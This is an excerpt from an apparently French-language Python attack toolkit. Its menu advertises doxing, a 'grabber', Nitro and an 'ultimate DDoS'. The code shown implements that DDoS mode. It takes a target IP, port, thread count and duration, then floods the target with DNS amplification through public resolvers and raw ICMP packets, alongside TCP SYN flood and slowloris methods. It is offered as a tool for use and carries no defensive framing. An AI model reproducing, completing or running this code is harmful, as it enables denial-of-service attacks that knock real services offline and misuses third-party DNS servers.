...
def menu():
    print(f"""
{Fore.WHITE}┌─────────────────────────────────────────────────────────────────┐
│  {Fore.CYAN}01{Fore.WHITE}  🔍  DOX SITE              {Fore.CYAN}02{Fore.WHITE}  💀  DDOS ULTIME          │
...
└─────────────────────────────────────────────────────────────────┘
{Fore.CYAN}┌─────────────────────────────────────────────────────────────────┐
│  📌  v{CURRENT_VERSION}  •  DOX + DDOS ULTIME + GRABBER + NITRO + DL  │
└─────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}
...
# ─── DDOS ULTIME AMÉLIORÉ ──────────────────────────────────────

def ddos_attack():
    global stop_attack
    clear()
    print(f"{Fore.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║                  💀  KENZAI DDOS ULTIME                      ║")
    print(f"║         Multi‑protocole • Amplification • Spoofing           ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    target = input(f"{Fore.YELLOW}🎯 IP cible : {Style.RESET_ALL}")
    port = input(f"{Fore.YELLOW}🔌 Port (80) : {Style.RESET_ALL}") or "80"
    threads = int(input(f"{Fore.YELLOW}🧵 Threads (500‑5000) : {Style.RESET_ALL}"))
    duration = int(input(f"{Fore.YELLOW}⏱️  Durée (secondes) : {Style.RESET_ALL}"))
    use_amplification = input(f"{Fore.YELLOW}📡 Amplification (DNS/NTP) ? (o/n) : {Style.RESET_ALL}").lower() == 'o'
    ...
    def udp_amplification():
        amplifiers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "64.6.64.6"]
        ...
        while not stop_attack:
            try:
                ...
                sock.sendto(dns_query, (amp, 53))
                sock.sendto(dns_query, (target, int(port)))
            except:
                pass
    ...
    def icmp_flood():
        try:
            ...
            while not stop_attack:
                try:
                    packet = b"\x08\x00" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00" + random._urandom(1400)
                    sock.sendto(packet, (target, 0))
                except:
                    pass
        except PermissionError:
            # Si pas de privilèges admin, on ignore l'ICMP
            pass

    # ─── Choix des attaques ─────────────────────────────────────
    attack_methods = [udp_amplification, tcp_syn_flood, slowloris, icmp_flood]
    if not use_amplification:
        attack_methods = [tcp_syn_flood, slowloris, icmp_flood]
